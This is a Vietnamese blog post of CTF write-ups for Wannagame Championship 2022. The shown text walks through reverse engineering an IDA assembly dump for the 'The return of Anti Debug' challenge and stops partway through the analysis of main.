<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="Overview Nguồn: https:&#x2F;&#x2F;cnsc.uit.edu.vn&#x2F;ctf  Đôi lời về trải nghiệm thi:Đây là cuộc thi về ctf do bên UIT tổ chức, trải qua 8 tiếng căng thẳng thì:…   Tuy được hạng 4 toàn bảng (hạng nhì offline), nma">
<meta property="og:type" content="article">
<meta property="og:title" content="Wannagame championship 2022 Writeups">
<meta property="og:url" content="https://mekanican.github.io/2022/12/13/wannagame-2022/index.html">
<meta property="og:site_name" content="Random blog">
<meta property="og:description" content="Overview Nguồn: https:&#x2F;&#x2F;cnsc.uit.edu.vn&#x2F;ctf  Đôi lời về trải nghiệm thi:Đây là cuộc thi về ctf do bên UIT tổ chức, trải qua 8 tiếng căng thẳng thì:…   Tuy được hạng 4 toàn bảng (hạng nhì offline), nma">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://wallpaperaccess.com/download/linux-981851">
<meta property="article:published_time" content="2022-12-13T03:12:40.000Z">
<meta property="article:modified_time" content="2022-12-17T17:53:12.093Z">
<meta property="article:author" content="Nghia Vo">
<meta property="article:tag" content="Reversing">
<meta property="article:tag" content="Misc">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://wallpaperaccess.com/download/linux-981851">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>Wannagame championship 2022 Writeups</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 5.4.2"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        
        <li><a class="icon" aria-label="Next post " href="/2022/07/07/Tan-man-ve-Pwn-Ep0/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post " href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://mekanican.github.io/2022/12/13/wannagame-2022/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://mekanican.github.io/2022/12/13/wannagame-2022/&text=Wannagame championship 2022 Writeups"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://mekanican.github.io/2022/12/13/wannagame-2022/&title=Wannagame championship 2022 Writeups"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://mekanican.github.io/2022/12/13/wannagame-2022/&is_video=false&description=Wannagame championship 2022 Writeups"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Wannagame championship 2022 Writeups&body=Check out this article: https://mekanican.github.io/2022/12/13/wannagame-2022/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://mekanican.github.io/2022/12/13/wannagame-2022/&title=Wannagame championship 2022 Writeups"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://mekanican.github.io/2022/12/13/wannagame-2022/&title=Wannagame championship 2022 Writeups"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://mekanican.github.io/2022/12/13/wannagame-2022/&title=Wannagame championship 2022 Writeups"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://mekanican.github.io/2022/12/13/wannagame-2022/&title=Wannagame championship 2022 Writeups"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://mekanican.github.io/2022/12/13/wannagame-2022/&name=Wannagame championship 2022 Writeups&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://mekanican.github.io/2022/12/13/wannagame-2022/&t=Wannagame championship 2022 Writeups"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Overview"><span class="toc-number">1.</span> <span class="toc-text">Overview</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Doi-loi-ve-trai-nghiem-thi"><span class="toc-number">1.1.</span> <span class="toc-text">Đôi lời về trải nghiệm thi:</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Write-ups"><span class="toc-number">2.</span> <span class="toc-text">Write ups</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-The-return-of-Anti-Debug"><span class="toc-number">2.1.</span> <span class="toc-text">1. The return of Anti Debug</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Danh-sach-cac-file"><span class="toc-number">2.1.1.</span> <span class="toc-text">Danh sách các file:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tong-quan"><span class="toc-number">2.1.2.</span> <span class="toc-text">Tổng quan:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Noi-chuong-trinh-bat-dau"><span class="toc-number">2.1.3.</span> <span class="toc-text">Nơi chương trình bắt đầu</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Khoi-phuc-bien"><span class="toc-number">2.1.4.</span> <span class="toc-text">Khôi phục biến</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Calling-convention-cdecl"><span class="toc-number">2.1.5.</span> <span class="toc-text">Calling convention __cdecl</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Phan-tich-ham-main-thong-qua-tu-tao-pseudo-code"><span class="toc-number">2.1.6.</span> <span class="toc-text">Phân tích hàm main thông qua tự tạo pseudo-code</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lap-va-re-nhanh"><span class="toc-number">2.1.7.</span> <span class="toc-text">Lặp và rẽ nhánh</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ham-sus"><span class="toc-number">2.1.8.</span> <span class="toc-text">Hàm sus</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Huong-giai-quyet"><span class="toc-number">2.1.9.</span> <span class="toc-text">Hướng giải quyết</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-Baby-APK"><span class="toc-number">2.2.</span> <span class="toc-text">2. Baby APK</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Danh-sach-cac-file-1"><span class="toc-number">2.2.1.</span> <span class="toc-text">Danh sách các file:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tong-quan-1"><span class="toc-number">2.2.2.</span> <span class="toc-text">Tổng quan:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Decompile-voi-jadx"><span class="toc-number">2.2.3.</span> <span class="toc-text">Decompile với jadx</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Phan-tich-kernel-blob-bin"><span class="toc-number">2.2.4.</span> <span class="toc-text">Phân tích kernel_blob.bin</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-Memory"><span class="toc-number">2.3.</span> <span class="toc-text">3. Memory</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Danh-sach-cac-file-2"><span class="toc-number">2.3.1.</span> <span class="toc-text">Danh sách các file</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Too-Short-Didn%E2%80%99t-Read"><span class="toc-number">2.3.2.</span> <span class="toc-text">Too Short, Didn’t Read</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-Kittensware"><span class="toc-number">2.4.</span> <span class="toc-text">4. Kittensware</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Danh-sach-cac-file-3"><span class="toc-number">2.4.1.</span> <span class="toc-text">Danh sách các file:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tong-quan-2"><span class="toc-number">2.4.2.</span> <span class="toc-text">Tổng quan:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Suspected-binary-in-network-trafic"><span class="toc-number">2.4.3.</span> <span class="toc-text">Suspected binary in network trafic</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Phan-tich-bang-IDA"><span class="toc-number">2.4.4.</span> <span class="toc-text">Phân tích bằng IDA</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Khoi-tao"><span class="toc-number">2.4.4.1.</span> <span class="toc-text">Khởi tạo</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Tao-khoa-cong-khai-voi-RC4"><span class="toc-number">2.4.4.2.</span> <span class="toc-text">Tạo khoá công khai với RC4</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Thiet-lap-ket-noi"><span class="toc-number">2.4.4.3.</span> <span class="toc-text">Thiết lập kết nối</span></a></li></ol></li></ol></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        Wannagame championship 2022 Writeups
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Nghia Vo</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2022-12-13T03:12:40.000Z" itemprop="datePublished">13-12-2022</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/CTF/">CTF</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/Misc/" rel="tag">Misc</a>, <a class="tag-link-link" href="/tags/Reversing/" rel="tag">Reversing</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h1 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h1><ul>
<li>Nguồn: <a target="_blank" rel="noopener" href="https://cnsc.uit.edu.vn/ctf">https://cnsc.uit.edu.vn/ctf</a></li>
</ul>
<h2 id="Doi-loi-ve-trai-nghiem-thi"><a href="#Doi-loi-ve-trai-nghiem-thi" class="headerlink" title="Đôi lời về trải nghiệm thi:"></a>Đôi lời về trải nghiệm thi:</h2><p>Đây là cuộc thi về ctf do bên UIT tổ chức, trải qua 8 tiếng căng thẳng thì:… <img src="/images/Popo/1.webp" width="32" height="32" style="display:inline"></p>
<p><img src="/images/wannagame-2022_2022-12-13-10-30-46.png"></p>
<p>Tuy được hạng 4 toàn bảng (hạng nhì offline), nma cũng khá xót khi còn thiếu tận 1.000…1 bài nữa để lên top :&lt; và còn đâu đó 1 bài forensics dang dở + 1 bài cryptography biết hướng làm nhưng không ra <img src="/images/Popo/1.webp" width="32" height="32" style="display:inline">. </p>
<p>Tổng cộng hôm thi team mình được 7 bài (1 MISC + 1 WEB + 2 PWN + 3 REV), trong đó thì mình ăn first blood cả 3 bài rev :)) + thêm bài misc khá là …</p>
<p>Trong danh sách writeups sau, mình sẽ trình bày theo mốc thời gian làm, thay vì độ khó :&gt;. Thứ tự độ khó tăng dần sẽ là Memory -&gt; Baby APK -&gt; The return of Anti Debug -&gt; Kittensware.</p>
<h1 id="Write-ups"><a href="#Write-ups" class="headerlink" title="Write ups"></a>Write ups</h1><h2 id="1-The-return-of-Anti-Debug"><a href="#1-The-return-of-Anti-Debug" class="headerlink" title="1. The return of Anti Debug"></a>1. The return of Anti Debug</h2><p><img src="/images/wannagame-2022_2022-12-13-10-49-18.png"></p>
<h3 id="Danh-sach-cac-file"><a href="#Danh-sach-cac-file" class="headerlink" title="Danh sách các file:"></a>Danh sách các file:</h3><ul>
<li><a href="/data/wannagame-2022/antidebugreturn/code.txt">code.txt</a></li>
<li><a href="/data/wannagame-2022/antidebugreturn/dump">dump</a></li>
<li><a href="/data/wannagame-2022/antidebugreturn/log.txt">log.txt</a></li>
</ul>
<h3 id="Tong-quan"><a href="#Tong-quan" class="headerlink" title="Tổng quan:"></a>Tổng quan:</h3><p>Bài này là bài làm lại (đổi biến số) từ 1 bài bị lỗi (Anti Debug) của kỳ Wannagame năm trước :)). Trước hôm thi thì mình có giải lại thử, nói chung đây sẽ là dạng để bạn thể hiện khả năng đọc hiểu code assembly và hiểu cách mà một số decompiler (IDA, Ghidra, …) output thông tin <img src="/images/Popo/2.webp" width="32" height="32" style="display:inline"></p>
<p>Theo gợi ý, file <code>code.txt</code> sẽ có nội dung như sau (bỏ qua các struct ở đầu file):</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">;</span><br><span class="line">; +-------------------------------------------------------------------------+</span><br><span class="line">; |      This file was generated by The Interactive Disassembler (IDA)      |</span><br><span class="line">; |           Copyright (c) 2021 Hex-Rays, &lt;support@hex-rays.com&gt;           |</span><br><span class="line">; |                      License info: 48-206A-1AC0-08                      |</span><br><span class="line">; |                             IDA PRO 7.6 SP1                             |</span><br><span class="line">; +-------------------------------------------------------------------------+</span><br><span class="line">;</span><br><span class="line">; Input SHA256 : 8FFC76D721702FD9140973C39403152E44FF090B90BC9972107BBF9BC56BFAF5</span><br><span class="line">; Input MD5    : 2310C32D2C9478678CA2493BF866EDA4</span><br><span class="line">; Input CRC32  : 07A8B466</span><br><span class="line"></span><br><span class="line">; File Name   : C:\Users\nguye\OneDrive\Máy tính\a.out</span><br><span class="line">; Format      : ELF64 for x86-64 (Shared object)</span><br><span class="line">; Interpreter &#x27;/lib64/ld-linux-x86-64.so.2&#x27;</span><br><span class="line">; Needed Library &#x27;libc.so.6&#x27;</span><br><span class="line">;</span><br><span class="line">; Source File : &#x27;crtstuff.c&#x27;</span><br><span class="line">; Source File : &#x27;code.c&#x27;</span><br><span class="line">; Source File : &#x27;crtstuff.c&#x27;</span><br><span class="line"></span><br><span class="line">                .686p</span><br><span class="line">                .mmx</span><br><span class="line">                .model flat</span><br><span class="line">.intel_syntax noprefix</span><br></pre></td></tr></table></figure>

<p>Từ thông tin trên biết được file này là elf64, dump từ IDA 7.6, và không có liên kết thêm thư viện ngoài.</p>
<p>Câu hỏi được đặt ra là từ file này convert sang IDA được không &lt;(“), thì câu trả lời có vẻ là không (mặc dù file có vẻ chi tiết hơn so với challenge năm trước), có thể tìm hiểu thêm <a target="_blank" rel="noopener" href="https://reverseengineering.stackexchange.com/questions/3800/why-there-are-not-any-disassemblers-that-can-generate-re-assemblable-asm-code">tại đây</a></p>
<h3 id="Noi-chuong-trinh-bat-dau"><a href="#Noi-chuong-trinh-bat-dau" class="headerlink" title="Nơi chương trình bắt đầu"></a>Nơi chương trình bắt đầu</h3><p>Vị trí đầu tiên (Entry point) cần phải xem xét trong đa số trường hợp sẽ là <code>main</code> (Đây là hàm do IDA tự đặt tên dựa trên thông tin trên file), chỉ một số ít mới cần xét đến <code>_start</code> (Dành cho trường hợp nanomite - chương trình tự fork và tự điều khiển chính bản thân thông qua <code>ptrace</code>).</p>
<p>Hàm main:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">; =============== S U B R O U T I N E =======================================</span><br><span class="line"></span><br><span class="line">; Attributes: bp-based frame</span><br><span class="line"></span><br><span class="line">; <span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function">                <span class="keyword">public</span> main</span></span><br><span class="line"><span class="function">main            proc near               </span>; DATA XREF: _start+<span class="number">21</span>↑o</span><br><span class="line"></span><br><span class="line">var_BC          = dword ptr <span class="number">-0B</span>Ch</span><br><span class="line">var_B8          = dword ptr <span class="number">-0B</span>8h</span><br><span class="line">var_B4          = dword ptr <span class="number">-0B</span>4h</span><br><span class="line">stream          = qword ptr <span class="number">-0B</span>0h</span><br><span class="line">ptr             = qword ptr <span class="number">-0</span>A8h</span><br><span class="line">s               = byte ptr <span class="number">-0</span>A0h</span><br><span class="line">var_50          = byte ptr <span class="number">-50</span>h</span><br><span class="line">var_8           = qword ptr <span class="number">-8</span></span><br><span class="line"></span><br><span class="line">; __unwind &#123;</span><br><span class="line">                endbr64</span><br><span class="line">                push    rbp</span><br><span class="line">                mov     rbp, rsp</span><br><span class="line">                sub     rsp, <span class="number">0</span>C0h</span><br><span class="line">                mov     rax, fs:<span class="number">28</span>h</span><br><span class="line">                mov     [rbp+var_8], rax</span><br><span class="line">                <span class="keyword">xor</span>     eax, eax</span><br><span class="line">                lea     rsi, modes      ; <span class="string">&quot;r&quot;</span></span><br><span class="line">                lea     rdi, aSomethingsecre ; <span class="string">&quot;./somethingSecret.txt&quot;</span></span><br><span class="line">                call    _fopen</span><br><span class="line">                mov     [rbp+stream], rax</span><br><span class="line">                mov     edi, <span class="number">4</span>Ch ; <span class="string">&#x27;L&#x27;</span>  ; size</span><br><span class="line">                call    _malloc</span><br><span class="line">                mov     [rbp+ptr], rax</span><br><span class="line">                mov     rdx, [rbp+stream]</span><br><span class="line">                mov     rax, [rbp+ptr]</span><br><span class="line">                mov     rcx, rdx        ; stream</span><br><span class="line">                mov     edx, <span class="number">1</span>          ; n</span><br><span class="line">                mov     esi, <span class="number">42</span>h ; <span class="string">&#x27;B&#x27;</span>  ; size</span><br><span class="line">                mov     rdi, rax        ; ptr</span><br><span class="line">                call    _fread</span><br><span class="line">                mov     rax, [rbp+stream]</span><br><span class="line">                mov     rdi, rax        ; stream</span><br><span class="line">                call    _fclose</span><br><span class="line">                lea     rdi, s          ; <span class="string">&quot;Oh no, someone leaked something...&quot;</span></span><br><span class="line">                call    _puts</span><br><span class="line">                lea     rax, [rbp+s]</span><br><span class="line">                mov     edx, <span class="number">42</span>h ; <span class="string">&#x27;B&#x27;</span>  ; n</span><br><span class="line">                mov     esi, <span class="number">0</span>          ; c</span><br><span class="line">                mov     rdi, rax        ; s</span><br><span class="line">                call    _memset</span><br><span class="line">                lea     rax, [rbp+var_50]</span><br><span class="line">                mov     edx, <span class="number">42</span>h ; <span class="string">&#x27;B&#x27;</span>  ; n</span><br><span class="line">                mov     esi, <span class="number">0</span>          ; c</span><br><span class="line">                mov     rdi, rax        ; s</span><br><span class="line">                call    _memset</span><br><span class="line">                mov     edi, <span class="number">0</span>          ; timer</span><br><span class="line">                call    _time</span><br><span class="line">                mov     edi, eax        ; seed</span><br><span class="line">                call    _srand</span><br><span class="line">                mov     [rbp+var_BC], <span class="number">0</span></span><br><span class="line">                jmp     <span class="keyword">short</span> loc_1657</span><br><span class="line">; ---------------------------------------------------------------------------</span><br></pre></td></tr></table></figure>

<h3 id="Khoi-phuc-bien"><a href="#Khoi-phuc-bien" class="headerlink" title="Khôi phục biến"></a>Khôi phục biến</h3><p>Stack ở hàm <code>main</code> thuộc dạng <code>bp-based</code>, tức là các vị trí đều được tính trên base pointer. Từ đây ta sẽ cố gắng khôi phục lại <strong>kiểu dữ liệu ban đầu</strong> của từng biến</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var_BC          = dword ptr <span class="number">-0B</span>Ch</span><br><span class="line">var_B8          = dword ptr <span class="number">-0B</span>8h</span><br><span class="line">var_B4          = dword ptr <span class="number">-0B</span>4h</span><br><span class="line">stream          = qword ptr <span class="number">-0B</span>0h</span><br><span class="line">ptr             = qword ptr <span class="number">-0</span>A8h</span><br><span class="line">s               = byte ptr <span class="number">-0</span>A0h</span><br><span class="line">var_50          = byte ptr <span class="number">-50</span>h</span><br><span class="line">var_8           = qword ptr <span class="number">-8</span></span><br></pre></td></tr></table></figure>

<p>Để dễ hình dung, ta có bảng sau:</p>
<table>
<thead>
<tr>
<th>Biến</th>
<th>Loại pointer</th>
<th>Offset với biến trước</th>
<th>Offset với bp</th>
<th>Kiểu dữ liệu đề xuất</th>
</tr>
</thead>
<tbody><tr>
<td>var_BC</td>
<td>int*</td>
<td>0</td>
<td>-0x0bc</td>
<td>int (4b)</td>
</tr>
<tr>
<td>var_B8</td>
<td>int*</td>
<td>4</td>
<td>-0x0b8</td>
<td>int (4b)</td>
</tr>
<tr>
<td>var_B4</td>
<td>int*</td>
<td>4</td>
<td>-0x0b4</td>
<td>int (4b)</td>
</tr>
<tr>
<td>stream</td>
<td>long*</td>
<td>4</td>
<td>-0x0b0</td>
<td>void* (8b)</td>
</tr>
<tr>
<td>ptr</td>
<td>long*</td>
<td>8</td>
<td>-0x0a8</td>
<td>void* (8b)</td>
</tr>
<tr>
<td>s</td>
<td>char*</td>
<td>8</td>
<td>-0x0a0</td>
<td>char[0x50] (0x50b)</td>
</tr>
<tr>
<td>var_50</td>
<td>char*</td>
<td>0x50</td>
<td>-0x50</td>
<td>char[0x48] (0x48b)</td>
</tr>
<tr>
<td>var_8</td>
<td>long*</td>
<td>0x48</td>
<td>-0x8</td>
<td>long (8b) ~ <code>canary</code></td>
</tr>
<tr>
<td>bp</td>
<td>void*</td>
<td>0x8</td>
<td>0x0</td>
<td>base pointer</td>
</tr>
</tbody></table>
<h3 id="Calling-convention-cdecl"><a href="#Calling-convention-cdecl" class="headerlink" title="Calling convention __cdecl"></a>Calling convention __cdecl</h3><p>Tóm tắt lại, ta sẽ chi cần nhớ thứ tự như sau (calling convention này chỉ dành cho linux):</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">func1(<span class="keyword">int</span> a, <span class="keyword">int</span> b, <span class="keyword">int</span> c, <span class="keyword">int</span> d, <span class="keyword">int</span> e, <span class="keyword">int</span> f);</span><br><span class="line"><span class="comment">// a in RDI, b in RSI, c in RDX, d in RCX, e in R8, f in R9</span></span><br><span class="line"><span class="comment">// return value alway in RAX</span></span><br></pre></td></tr></table></figure>

<h3 id="Phan-tich-ham-main-thong-qua-tu-tao-pseudo-code"><a href="#Phan-tich-ham-main-thong-qua-tu-tao-pseudo-code" class="headerlink" title="Phân tích hàm main thông qua tự tạo pseudo-code"></a>Phân tích hàm main thông qua tự tạo pseudo-code</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">lea     rsi, modes      ; <span class="string">&quot;r&quot;</span></span><br><span class="line">lea     rdi, aSomethingsecre ; <span class="string">&quot;./somethingSecret.txt&quot;</span></span><br><span class="line">call    _fopen</span><br><span class="line">mov     [rbp+stream], rax</span><br></pre></td></tr></table></figure>

<p>Tương đương với</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stream = rax = fopen(<span class="string">&quot;./somethingSecret.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>Đây là 1 file khá đáng nghi, không được cung cấp bởi người ra đề ~&gt; có thể nội dung file chính là flag, tập trung vào nội dung lấy từ file.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov     edi, <span class="number">4</span>Ch ; <span class="string">&#x27;L&#x27;</span>  ; size</span><br><span class="line">call    _malloc</span><br><span class="line">mov     [rbp+ptr], rax</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ptr = rax = <span class="built_in">malloc</span>(<span class="number">0x4c</span>);</span><br><span class="line"><span class="comment">// Khởi tạo vùng nhớ trên heap size = 0x4c</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mov     rdx, [rbp+stream]</span><br><span class="line">mov     rax, [rbp+ptr]</span><br><span class="line">mov     rcx, rdx        ; stream</span><br><span class="line">mov     edx, <span class="number">1</span>          ; n</span><br><span class="line">mov     esi, <span class="number">42</span>h ; <span class="string">&#x27;B&#x27;</span>  ; size</span><br><span class="line">mov     rdi, rax        ; ptr</span><br><span class="line">call    _fread</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fread(ptr, <span class="number">0x42</span>, <span class="number">1</span>, stream);</span><br><span class="line"><span class="comment">// Đọc upto 0x42 ký tự từ stream vào ptr</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov     rax, [rbp+stream]</span><br><span class="line">mov     rdi, rax        ; stream</span><br><span class="line">call    _fclose</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fclose(stream);</span><br><span class="line"><span class="comment">// Đóng file</span></span><br></pre></td></tr></table></figure>
